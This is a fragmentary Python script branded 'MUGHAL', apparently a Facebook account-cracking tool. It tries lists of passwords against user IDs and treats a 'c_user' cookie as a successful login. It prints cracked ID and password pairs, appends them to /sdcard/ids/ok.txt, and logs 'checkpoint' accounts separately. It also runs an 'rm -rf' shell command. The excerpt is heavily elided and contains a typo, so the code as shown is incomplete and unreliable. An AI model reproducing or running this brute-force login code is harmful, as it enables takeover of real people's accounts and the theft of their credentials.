...
logo="'''' 
 ...
 | |\/| | | | | |  _| |_| | / _ \ | |    
 | |  | | |_| | |_| |  _  |/ ___ \| |___ 
 |_|__|_|\___/ \____|_|_|_/_/___\_\_____|
 | __ )|  _ \    / \  | \ | |  _ \       
 |  _ \| |_) |  / _ \ |  \| | | | |      
 | |_) |  _ <  / ___ \| |\  | |_| |      
...
--------------------------------------------------
  Author: Mughal Zada 
  Github: https://github.com/mughalzada099
...
def main():
    ...
    if option =='1':
        ...
        os.system('rm -rf .chrome.txt .android.txt && python mughal.py')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in get_cookie:
                print('\033[1;32m  [Successful-MUGHAL] '+uid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                with open('/sdcard/ids/ok.txt','a') as pushpa:
                    pushpa.write(uid+'|'+ps+'\n')
                break
            elif 'checkpoint' in get_cookie:
                print('\033[1;31m  [Checkpoint-MUGHAL] '+uid+' | '+ps+'\033[0;97m')
                cps.appene(uid)
                break
            else:
                continue
